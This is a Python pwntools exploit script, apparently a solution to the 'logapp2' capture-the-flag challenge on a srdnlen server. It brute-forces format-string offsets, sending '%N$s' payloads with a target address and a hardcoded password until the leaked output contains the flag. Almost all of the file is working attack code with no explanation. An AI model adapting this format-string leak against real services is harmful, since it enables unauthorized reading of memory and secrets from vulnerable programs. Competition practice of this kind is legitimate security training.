#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error' # se non vuoi vedere i loggin
exe = context.binary = ELF(args.EXE or './logapp2')

host = args.HOST or 'logapp2.chall.srdnlen.it'
port = int(args.PORT or 443)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x401672
continue
'''.format(**locals())

# -- Exploit goes here --

# 0x4040e0

i = 78

first = True
while True:
    i += 1
    try:
        io = start()
        payload = (f"%{i}$s").encode()
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b": ", payload)
        io.sendlineafter(b": ", flat(0x4040e0))
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b": ", b"SuperStrongPassword")
        resp1 = io.recvline()
        resp2 = io.recvline()
        resp3 = io.recvline()
        resp4 = io.recvline()
        # print(resp1)
        # print(i, resp2)
        if b"srdnlen" in resp2:
            print(resp2.decode())
            io.close()
            break
        first = False
        # io.interactive()
        io.close()
    except EOFError:
        pass

